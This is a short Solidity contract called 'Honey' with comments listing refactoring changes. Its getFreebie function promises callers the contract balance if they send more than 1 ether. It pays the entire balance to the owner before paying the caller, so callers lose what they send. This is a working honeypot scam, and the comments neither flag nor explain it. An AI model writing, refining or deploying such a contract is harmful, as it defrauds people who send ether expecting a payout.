pragma solidity ^0.4.19;

contract Honey {
    address public owner;

    function Honey() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}

// Changes Made:
// - Changed the name of Owner to owner for consistency
// - Added a constructor to set the owner address
// - Removed the hardcoded address check in withdraw() function
// - Added a require statement to check the return value of the external call in command() function